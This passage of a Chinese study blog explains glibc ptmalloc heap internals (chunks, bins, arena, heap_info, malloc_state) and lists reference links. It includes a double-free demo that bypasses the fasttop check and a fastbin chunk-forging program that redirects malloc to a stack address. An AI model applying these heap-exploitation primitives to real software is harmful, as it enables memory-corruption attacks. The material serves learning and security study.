<p>2.scanf<code>和</code>printf<code>都会在第一次调用的时候用</code>malloc<code>申请缓冲区，1KB或4KB，视stdio可不可交互而定。</code></p>
<p>3.malloc申请缓冲区有对齐条件 ，大小是2*sizeof(size_t)。</p>
<p>4.（不考虑<code>free</code>掉重分配） 小于128KB的<code>malloc</code>会在地址上相邻，往高地址增长。 </p>
<p>5.malloc会在分配的地址前预留2*sizeof(size_t)的空间维护<code>malloc_chunk</code>信息 。</p>
</blockquote>
<p><img src="https://i.imgur.com/Iy59yqk.png"></p>
<p>//x在主线程中，malloc后heap会看见三个部分，这个堆区的总大小是0x21000（vmmap），第一次malloc首先会分配出这一块堆区，然后分出|top chunk | chunk|然后根据用户的malloc从top chunk中切割堆块给用户，所以形成这三块内容。</p>
<p>top chunk的地址会变动从小到大为了给下面的chunk腾空间</p>
<p>struct malloc_state（arena的结构体）</p>
<blockquote>
<p>该结构用于管理堆，记录每个arena当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk等等。无论是thread arena还是main arena，它们都只有一个malloc state结构。由于thread的arena可能有多个，malloc state结构会在最新申请的arena中。注意，main arena的malloc_state并不是 heap segment的一部分，而是一个全局变量，存储在libc.so的数据段。</p>
</blockquote>
<p>heap_info:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序刚开始执行时，每个线程是没有heap区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap是不连续的，因此需要记录不同heap之间的链接结构。</span><br><span class="line"></span><br><span class="line">它只有thread_arena拥有，因为主线程只有一个堆。</span><br></pre></td></tr></table></figure>






<h3 id="安装heaptrack"><a href="#安装heaptrack" class="headerlink" title="安装heaptrack"></a>安装heaptrack</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/KDE/heaptrack.git">https://github.com/KDE/heaptrack.git</a></p>
<p>cd heaptrack # i.e. the source folder<br>mkdir build<br>cd build<br>cmake -DCMAKE_BUILD_TYPE=Release .. # 这一步有啥差错下载boost依赖和libunwind依赖<br>make -j$(nproc)</p>
<p>boost 依赖</p>
<blockquote>
<p>apt-cache search boost</p>
<p>sudo apt-get install libboost-all-dev  //这一步没下载完全则apt-get update</p>
</blockquote>
<p>libunwind依赖</p>
<blockquote>
<p>sudo apt-get install -y libunwind-dev</p>
</blockquote>
<p>apt-get install heaptrack</p>
<p>sudo apt install heaptrack-gui</p>
<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>a = malloc(10);     // 0xa04010<br>b = malloc(10);     // 0xa04030<br>c = malloc(10);     // 0xa04050</p>
<p>free(a);<br>free(b);  // To bypass “double free or corruption (fasttop)” check<br>free(a);  // Double Free !!</p>
<p><strong>d = malloc(10);     // 0xa04010</strong><br>e = malloc(10);     // 0xa04030<br><strong>f = malloc(10);     // 0xa04010   - Same as ‘d’ !</strong></p>
<blockquote>
<p>–&gt;a–&gt;b–&gt;a</p>
</blockquote>
<h3 id="forging-chunk"><a href="#forging-chunk" class="headerlink" title="forging chunk"></a>forging chunk</h3><p>空闲链表是根据size和fd bk来链接上下空闲chunk的</p>
<p>a指向data的位置也就是之后fd的位置，将假chunk的地址给a，也就是把假chunk链接到了空闲链表的尾部，它后面去找的时候就按照fd bk查找这里同时有个usfree漏洞和构造假chunk的利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> *<span class="title">bck</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];               <span class="comment">// padding</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">// First grab a fast chunk</span></span><br><span class="line">    <span class="keyword">void</span>* a = <span class="built_in">malloc</span>(<span class="number">10</span>);               <span class="comment">// &#x27;a&#x27; points to 0x555555756a80</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a forged chunk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> <span class="title">chunk</span>;</span>    <span class="comment">// At address 0x7fffffffe9e0</span></span><br><span class="line">    chunk.size = <span class="number">0x20</span>;            <span class="comment">// This size should fall in the same fastbin</span></span><br><span class="line">   · data = (<span class="keyword">char</span> *)&amp;chunk.fd;     <span class="comment">// Data starts here for an allocated chunk</span></span><br><span class="line">   · <span class="built_in">strcpy</span>(data, <span class="string">&quot;attacker&#x27;s data&quot;</span>); <span class="comment">//也就是把攻击数据填入假chunk的fd位置也就是data开始的地方</span></span><br><span class="line">------------------------------------------</span><br><span class="line">    <span class="comment">//上面两行point</span></span><br><span class="line">    -----------------------------------------------</span><br><span class="line">    <span class="comment">// Put the fast chunk back into fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// Modify &#x27;fd&#x27; pointer of &#x27;a&#x27; to point to our forged chunk</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)a) = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)&amp;chunk;</span><br><span class="line">    <span class="comment">// Remove &#x27;a&#x27; from HEAD of fastbin</span></span><br><span class="line">    <span class="comment">// Our forged chunk will now be at the HEAD of fastbin</span></span><br><span class="line">    <span class="keyword">void</span>* tmp = <span class="built_in">malloc</span>(<span class="number">10</span>);                   <span class="comment">// Will return 0x555555756a80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">10</span>);    <span class="comment">// Points to 0x7fffffffea00  这里可能就是危险数据了</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (<span class="keyword">char</span>*)victim);<span class="comment">//调用危险数据</span></span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="jarvisoj-itemboard"><a href="#jarvisoj-itemboard" class="headerlink" title="jarvisoj_itemboard"></a><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-1126025.html">jarvisoj_itemboard</a></h3><p>参考链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361975956">https://zhuanlan.zhihu.com/p/361975956</a></p>
<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/398970.html">http://cn-sec.com/archives/398970.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_chuck">https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_chuck</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44728033/article/details/105520777">https://blog.csdn.net/qq_44728033/article/details/105520777</a>      —windows10 段堆机制和nt堆对比</p>
<p><a target="_blank" rel="noopener" href="https://straightblast.medium.com/my-poc-walkthrough-for-cve-2021-21974-a266bcad14b9">https://straightblast.medium.com/my-poc-walkthrough-for-cve-2021-21974-a266bcad14b9</a>   —-待复现</p>
<p>CVE-2021-3156     –sudo堆漏洞提权</p>
<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6975">http://www.vuln.cn/6975</a>    —-线程堆开辟内部</p>
<p><a target="_blank" rel="noopener" href="https://github.com/DhavalKapil/heap-exploitation/tree/master/attacks">https://github.com/DhavalKapil/heap-exploitation/tree/master/attacks</a>  —堆利用手法，待看</p>
<p><a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/vlc-media-player-2-2-8-use-after-free%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/vlc-media-player-2-2-8-use-after-free%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a>    win10uaf漏洞利用</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115462494">https://blog.csdn.net/A951860555/article/details/115462494</a>  hook利用及其说明</p>
<p><a target="_blank" rel="noopener" href="https://www.duo.uio.no/bitstream/handle/10852/69062/7/mymaster.pdf">https://www.duo.uio.no/bitstream/handle/10852/69062/7/mymaster.pdf</a>   一些堆利用pdf  2.29最高  全英文</p>
<h1 id="Linux堆的一些基础知识"><a href="#Linux堆的一些基础知识" class="headerlink" title="Linux堆的一些基础知识"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html">Linux堆的一些基础知识</a></h1><p>目录</p>
<ul>
<li>堆的概述<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86">什么是堆</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E5%A0%86%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">堆的基本操作</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E5%A0%86%E6%93%8D%E4%BD%9C%E8%83%8C%E5%90%8E%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">堆操作背后的系统调用</a></li>
</ul>
</li>
<li>堆的相关数据结构<ul>
<li>微观结构<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_chuck">malloc_chuck</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#chunk%E7%9B%B8%E5%85%B3%E5%AE%8F">chunk相关宏</a></li>
<li>bin<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84bin">数组中的bin</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#fastbin">fastbin</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#unsorted-bin%E7%9A%84%E6%9D%A5%E6%BA%90">unsorted bin的来源</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#last-remainder">last remainder</a></li>
</ul>
</li>
<li>宏观结构<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#arena">arena</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#heap_info">heap_info</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_state">malloc_state</a></li>
</ul>
</li>
</ul>
</li>
<li>深入了解堆实现<ul>
<li>堆初始化<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_consolidate">malloc_consolidate()</a></li>
</ul>
</li>
<li>创建堆<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#unlink">unlink</a></li>
</ul>
</li>
<li>申请内存块<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#_libc_malloc">_libc_malloc</a></li>
<li>_int_malloc<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#chunk%E4%B8%8D%E5%90%8C%E8%8C%83%E5%9B%B4%E7%94%B3%E8%AF%B7%E5%AE%9E%E7%8E%B0">chunk不同范围申请实现</a></li>
</ul>
</li>
</ul>
</li>
<li>释放内存块<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#_libc_free">_libc_free</a></li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E5%86%85%E5%AE%B9%E6%9D%A5%E6%BA%90">内容来源</a></li>
</ul>
<h1 id="堆的概述"><a href="#堆的概述" class="headerlink" title="堆的概述"></a>堆的概述</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1堆用来在程序运行时动态的分配内存，对其实就是虚拟空间里从地址向高地址增长的连续的线性区域。</span><br></pre></td></tr></table></figure>
<h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><ul>
<li>void *malloc(unsigned int size)：作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</li>
<li>void free(void *ptr)：释放之前调用 calloc、malloc 或 realloc 所分配的内存空间。</li>
</ul>
<h2 id="堆操作背后的系统调用"><a href="#堆操作背后的系统调用" class="headerlink" title="堆操作背后的系统调用"></a>堆操作背后的系统调用</h2><ul>
<li>brk()：将数据段(.data)的最高地址指针_edata往高地址推。（从堆头开始，参数为地址）</li>
<li>mmap()：在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。（分配大于128k）</li>
<li>sbrk()：将地址指针往高地址推。（从当前指针位置开始，参数为指针增量）</li>
<li>mummap()：删除地址空间。</li>
</ul>
<h1 id="堆的相关数据结构"><a href="#堆的相关数据结构" class="headerlink" title="堆的相关数据结构"></a>堆的相关数据结构</h1><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chuck"><a href="#malloc-chuck" class="headerlink" title="malloc_chuck"></a>malloc_chuck</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1申请的内存chunk在ptmalloc内部用malloc_chunk结构体表示。</span><br></pre></td></tr></table></figure>
<p>malloc_chunk的一些字段</p>
<ul>
<li>prev_size：如果该 chunk 的物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）是空闲的话，那该字段记录的是前一个 chunk 的大小(包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk。</li>
<li>size：该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示:<ul>
<li>NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。</li>
<li>IS_MAPPED：记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE：记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并。</li>
</ul>
</li>
<li>fd，bk：chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:<ul>
<li>fd：指向下一个（非物理相邻）空闲的 chunk。</li>
<li>bk：指向上一个（非物理相邻）空闲的 chunk。</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理。</li>
</ul>
</li>
<li>fd_nextsize， bk_nextsize：也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。（指向比它大的空闲块）</li>
<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。（指向比它小的空闲块）</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</li>
</ul>
</li>
</ul>
<h3 id="chunk相关宏"><a href="#chunk相关宏" class="headerlink" title="chunk相关宏"></a>chunk相关宏</h3><ul>
<li>chunk与mem指针头部的转换<ul>
<li>define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</li>
<li>define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</li>
</ul>
</li>
<li>最小的chunk大小<ul>
<li>define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))（offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。）</li>
</ul>
</li>
<li>define MINSIZE (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;~MALLOC_ALIGN_MASK))（满足SIZE_SZ的最小上界）</li>
<li>检查分配给用户的内存是否对齐<ul>
<li>define aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</li>
<li>define misaligned_chunk(p) ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp; MALLOC_ALIGN_MASK)</li>
</ul>
</li>
<li>请求字节数判断<ul>
<li>define REQUEST_OUT_OF_RANGE(req) ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</li>
</ul>
</li>
<li>将用户请求内存大小转为实际分配内存大小<ul>
<li>define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</li>
<li>define checked_request2size(req, sz) if (REQUEST_OUT_OF_RANGE(req)) { __set_errno(ENOMEM); return 0;} (sz) = request2size(req);</li>
</ul>
</li>
<li>标记位相关<ul>
<li>define PREV_INUSE 0x1</li>
<li>define prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</li>
<li>size field is or’ed with IS_MMAPPED if the chunk was obtained with mmap()</li>
<li>define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</li>
<li>define NON_MAIN_ARENA 0x4</li>
<li>define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)+</li>
</ul>
</li>
<li>获取chunk size<ul>
<li>define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</li>
<li>define chunksize_nomask(p) ((p)-&gt;mchunk_size)</li>
</ul>
</li>
<li>获取下一个物理相邻的chunk<ul>
<li>define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</li>
</ul>
</li>
<li>获取前一个chunk的信息<ul>
<li>define prev_size(p) ((p)-&gt;mchunk_prev_size)</li>
<li>define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</li>
</ul>
</li>
<li>当前chunk使用状态相关操作<ul>
<li>define inuse(p)((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</li>
<li>define set_inuse(p)((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</li>
<li>define clear_inuse(p)((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE）</li>
</ul>
</li>
<li>设置chunk的size字段<ul>
<li>define set_head_size(p, s)((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</li>
<li>define set_head(p, s) ((p)-&gt;mchunk_size = (s))</li>
<li>define set_foot(p, s) (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</li>
</ul>
</li>
<li>获取指定偏移的chunk<ul>
<li>define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</li>
</ul>
</li>
<li>指定偏移处chunk使用状态相关操作<ul>
<li>define inuse_bit_at_offset(p, s)(((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</li>
<li>define set_inuse_bit_at_offset(p, s)(((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</li>
<li>define clear_inuse_bit_at_offset(p, s)(((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</li>
</ul>
</li>
</ul>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为4类：fast bins，small bins，large bins，unsorted bin</span><br></pre></td></tr></table></figure>
<h4 id="数组中的bin"><a href="#数组中的bin" class="headerlink" title="数组中的bin"></a>数组中的bin</h4><ul>
<li>unsorted bin：这里面的chunk没有进行排序，存储的chunk比较杂。</li>
<li>small bin：索引从 2 到 63 的 bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为2个机器字长，即32位相差8字节，64位相差16字节。</li>
<li>large bins：small bins后面的bin，large bins中的每一个 bin 都包含一定范围内的chunk，其中的chunk按fd指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
<li>上述这些bin的排布都会遵循一个原则：任意两个物理相邻的空闲chunk不能在一起。</li>
</ul>
<h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><h4 id="unsorted-bin的来源"><a href="#unsorted-bin的来源" class="headerlink" title="unsorted bin的来源"></a>unsorted bin的来源</h4><ul>
<li>当一个较大的chunk被分割成两半后，如果剩下的部分大于MINSIZE，就会被放到unsorted bin中。</li>
<li>释放一个不属于fast bin的chunk，并且该chunk不和top chunk紧邻时，该chunk会被首先放到unsorted bin中。</li>
</ul>
<h3 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h3><p>在用户使用malloc请求分配内存时,ptmalloc2找到的chunk可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为last remainder chunk，unsort bin也会存这一块。top chunk分割剩下的部分不会作为last remainer。</p>
<h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1我们知道一个线程申请的1个&#x2F;多个堆包含很多的信息：二进制位信息，多个malloc_chunk信息等这些堆需要东西来进行管理，那么Arena就是来管理线程中的这些堆的。</span><br></pre></td></tr></table></figure>


<p><a target="_blank" rel="noopener" href="https://www.cxybb.com/article/qq_40890756/100836912">https://www.cxybb.com/article/qq_40890756/100836912</a>     堆段与heap_info 与arena</p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1程序刚开始执行时，每个线程是没有heap区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap是不连续的，因此需要记录不同heap之间的链接结构。</span><br></pre></td></tr></table></figure>
<p>该数据结构是专门为从Memory Mapping Segment处申请的内存准备的，即为非主线程准备的。<br>主线程可以通过sbrk()函数扩展program break location获得（直到触及Memory Mapping Segment），只有一个heap，没有heap_info数据结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1234567891011typedef struct _heap_info</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; &#x2F;* 堆对应的 arena 的地址 *&#x2F;</span><br><span class="line">  struct _heap_info *prev; &#x2F;* 由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个可能会有多个堆。prev即记录了上一个 heap_info 的地址。这里可以看到每个堆的 heap_info 是通过单向链表进行链接的 *&#x2F;</span><br><span class="line">  size_t size;   &#x2F;* size 表示当前堆的大小 *&#x2F;</span><br><span class="line">  size_t mprotect_size; &#x2F;* 最后一部分确保对齐  *&#x2F;</span><br><span class="line">  &#x2F;* Make sure the following data is properly aligned, particularly</span><br><span class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="line">     MALLOC_ALIGNMENT. *&#x2F;</span><br><span class="line">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">1该结构用于管理堆，记录每个arena当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk等等。无论是thread arena还是main arena，它们都只有一个malloc state结构。由于thread的arena可能有多个，malloc state结构会在最新申请的arena中。注意，main arena的malloc_state并不是 heap segment的一部分，而是一个全局变量，存储在libc.so的数据段。</span><br><span class="line">struct malloc_state &#123;</span><br><span class="line">    &#x2F;* 该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成候才能够使用。  *&#x2F;</span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    &#x2F;* flags记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。  *&#x2F;</span><br><span class="line">    int flags;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 存放每个 fast chunk 链表头部的指针 *&#x2F;</span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    &#x2F;* 指向分配区的 top chunk *&#x2F;</span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 最新的 chunk 分割之后剩下的那部分 *&#x2F;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。 *&#x2F;</span><br><span class="line">    mchunkptr bins[ NBINS * 2 - 2 ];</span><br><span class="line"></span><br><span class="line">    &#x2F;* ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chun..*&#x2F;</span><br><span class="line">    unsigned int binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    &#x2F;* Linked list, points to the next arena *&#x2F;</span><br><span class="line">    struct malloc_state *next;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">       by free_list_lock in arena.c.  *&#x2F;</span><br><span class="line">    struct malloc_state *next_free;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Number of threads attached to this arena.  0 if the arena is 